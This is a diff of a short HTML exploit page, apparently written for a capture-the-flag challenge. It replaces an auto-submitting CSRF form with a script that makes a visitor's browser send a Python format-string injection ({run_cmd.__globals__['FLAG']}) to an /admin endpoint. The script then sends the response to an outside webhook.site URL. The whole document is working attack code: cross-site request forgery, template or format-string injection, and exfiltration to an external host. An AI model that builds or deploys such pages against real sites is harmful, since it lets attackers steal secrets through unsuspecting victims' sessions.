@@ -1,12 +1,18 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>CSRF Page</title>
+  <title>Exploitation</title>
 </head>
-<body onload="document.getElementById('redirectForm').submit()">
-    <form id="redirectForm" action="https://saymyname-6d87ed9baea34c35.deploy.phreaks.fr/admin" method="GET">
-        <input type="hidden" name="prompt" value="{run_cmd.__globals__[&#x27;FLAG&#x27;]}">
-    </form>
-    <p>Redirection en cours...</p>
+<body>
+  <script>
+    // Faire la requête à /admin avec l'injection
+    fetch('/admin?prompt={run_cmd.__globals__["FLAG"]}')
+      .then(response => response.text())
+      .then(data => {
+        // Envoyer le résultat à votre webhook
+        fetch('https://webhook.site/9bbc17f3-c4f0-4980-a572-9b1d011932fc?result=' + encodeURIComponent(data));
+      });
+  </script>
+  <p>Chargement...</p>
 </body>
 </html>
